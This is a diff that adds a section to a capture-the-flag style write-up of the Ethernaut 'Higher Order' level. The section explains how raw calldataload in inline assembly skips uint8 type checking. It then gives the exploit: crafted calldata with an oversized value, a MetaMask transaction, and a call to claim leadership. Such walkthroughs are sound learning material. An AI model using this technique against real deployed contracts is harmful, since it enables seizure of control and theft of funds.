@@ -1907,3 +1907,79 @@ This challenge was about **precise manipulation of calldata and function selecto
 
 ### Level Completed
 ![Level Complete Output](assets/switch.png)
+
+
+# Ethernaut Level: **Higher Order**
+
+---
+
+### Strategy
+
+The objective is to become the **Commander** by successfully calling `claimLeadership()`. But that function only allows you to become the commander if `treasury > 255`.
+
+The function that sets the treasury is `registerTreasury(uint8)`. A `uint8` can only hold values between `0` and `255`, so how can we possibly set `treasury > 255`?
+
+The **loophole lies in the use of inline assembly** in `registerTreasury()`, which **loads the value directly from calldata** without actually decoding it as a `uint8`.
+
+---
+
+### Vulnerability Summary
+
+```solidity
+assembly {
+    sstore(treasury_slot, calldataload(4))
+}
+```
+
+- This line bypasses Solidity’s normal type checking.
+- It loads **32 bytes** from calldata starting at offset 4 (where the function parameter would be).
+- That raw value is directly stored into the `treasury` slot, regardless of its size.
+- We can send **any 32-byte value**, even one much larger than 255.
+
+---
+
+### Exploit Steps
+
+#### 1. Craft calldata for `registerTreasury(uint8)` with a huge value
+
+We don’t care about actual type safety — the contract uses `calldataload(4)` directly. So send something like:
+
+```js
+const calldata = '0x'
+  + '211c85ab' // function selector for registerTreasury(uint8)
+  + 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // any value > 255
+```
+
+This sets `treasury` to a massive number.
+
+#### 2. Send the transaction
+
+Used browser console (via MetaMask and Web3) to send the calldata:
+
+```js
+await ethereum.request({
+  method: 'eth_sendTransaction',
+  params: [{
+    from: (await ethereum.request({ method: 'eth_requestAccounts' }))[0],
+    to: instance,
+    data: calldata
+  }]
+});
+```
+
+#### 3. Claim leadership
+
+```js
+await contract.claimLeadership();
+```
+
+#### 4. Confirm you're the commander
+
+```js
+await contract.commander(); // returns your address 
+```
+
+---
+
+### Level Completed
+![Level Complete Output](assets/Higherorder.png)
